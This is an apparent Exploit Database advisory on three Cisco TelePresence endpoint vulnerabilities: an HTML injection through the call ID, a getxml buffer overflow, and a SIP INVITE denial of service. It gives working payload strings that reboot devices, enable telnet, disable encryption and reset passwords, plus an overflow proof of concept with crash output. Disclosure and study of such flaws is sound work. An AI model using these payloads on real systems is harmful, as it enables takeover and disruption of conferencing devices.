Details.
Cisco TelePresence is an umbrella term for Video Conferencing Hardware
and Software, Infrastructure and Endpoints. The C & MXP Series are the
Endpoints used on desks or in boardrooms to provide users with a
termination point for Video Conferencing.

1. Post-authentication HTML Injection - CVE-2011-2544 (CSCtq46488):
Cisco TelePresence Endpoints have a web interface (HTTP or HTTPS) for
managing, configuring and reporting. It is possible to set the Call ID
(with H.323 or SIP) to a HTML value. If a call is made to another
endpoint and an authenticated user browses to the web interface on the
endpoint receiving the call (e.g. to view call statistics), the
HTML will render locally within the context of the logged in user. From
this point it is possible to make changes to the system as the
authenticated user. The flaw is due to the flexibility of the H.323 ID
or SIP Display Name fields and failure to correctly validate user input.

Examples (MXP):
Rebooting the system: <IMG SRC="/reboot&Yes=please">
The attacker may also choose to change passwords in the system, disable
encryption or enable telnet:
<IMG SRC=/html_select_status?reload=other.ssi&telnet=On>
<IMG SRC=/html_select_status?reload=security.ssi&/Configuration/
Conference/Encryption/Mode=Off&/Configuration/SystemUnit/Password=test>

2. Post-authentication Memory Corruption - CVE-2011-2543 (CSCtq46496):
Cisco TelePresence systems (Endpoints and Infrastructure) use XPath for
setting and getting configuration.

Example syntax is:
http://ip/getxml?location=/Configuration/Video
The request is sent to a locally listening shell (tshell). This is the
case for all requests relating to performing an action on the system (e.g.
config get or set). The shell then sends the input to the "main"
application (/app/main, id=0), and the data is passed as a parameter.

It was discovered that the getXML handle does not properly perform
length checking on the user supplied input before passing it to the
tshell. Furthermore, there is no length checking performed in the tshell
and no bounds checking performed in the main application where the
parameter is consumed. As such, it is possible to send input that
exceeds the size of the receiving buffer, subsequently causing an
invalid address to be read. This causes a reboot on the Endpoints. The
VCS will not reboot, the process will crash by SIGSEGV (or sigabrt) but
it will restart the process itself which drops all calls.

Proof of Concept: GET
/wsgi/getxml?location="+("A"*5200)+("\x60"*4)+("X"*4)+"HTTP/1.1\r\n
Host: 192.168.6.99\r\n\r\n"

Received signal SIGSEGV (11) in thread 0x129e8480, TID 2670
Illegal memory access at: 0x5858585c
Registers:
GPR00: 00f2c908 129e5960 129ef920 00000005 00000040 0000000c 00000037

00000002
GPR24: 129e59a8 00000002 0f3ea3a4 129e5a64 00000037 00000005 0f410bac
129e5960
GPR24: 129e59a8 00000002 0f3ea3a4 129e5a64 00000037 00000005 0f410bac
129e5960
NIP: 0f39abc8 MSR: 0000d032 OGPR3: 00000002

As you can see, the crash string is passed as a parameter in GPR 8.
The severity of this issue is compounded by the fact that the main
application runs as root, this could potentially lead to arbitrary code
execution.

3. Pre-authentication SIP Denial of Service - CVE-2011-2577 (CSCtq46500):
Cisco TelePresence Endpoints utilise SIP for the call setup protocol.
Sending a SIP INVITE with a 4x8 a"s in the MAC Address field and the
receive field causes the system to reboot.

Proof of Concept: MXP:
Exception 0x1100 : Data TLB load miss Active task
FsmMain FSM process : SipTrnsp(0) FSM message : SipTrnsp_Send_Msg_Req
from SipTrnsp(0) Data TLB miss (DMISS) : 0x00000000 (illegal addr.
accessed)

Solution.
Upgrade to TC4.2 for the C series to fix validation issues.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
